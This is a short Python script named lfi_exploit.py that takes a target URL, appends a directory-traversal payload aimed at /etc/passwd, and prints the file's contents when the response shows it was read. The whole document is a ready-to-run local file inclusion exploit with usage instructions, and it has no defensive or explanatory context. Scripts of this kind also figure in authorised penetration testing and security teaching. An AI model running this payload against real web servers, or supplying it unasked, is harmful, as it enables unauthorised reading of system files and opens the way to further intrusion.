import sys
import requests

if len(sys.argv) < 2:
    print("Usage: python3 lfi_exploit.py <vulnerable_url>")
    print("Example: python3 lfi_exploit.py http://example.com/page.php?file=")
    sys.exit(1)

base_url = sys.argv[1]
payload = "../../../../../../etc/passwd"

print(f"[*] Trying LFI payload on: {base_url}{payload}")
try:
    r = requests.get(base_url + payload)
    if "root:x" in r.text:
        print("[+] LFI vulnerability confirmed! '/etc/passwd' contents found:")
        print(r.text)
    else:
        print("[-] No LFI detected.")
except Exception as e:
    print(f"[!] Error: {e}")
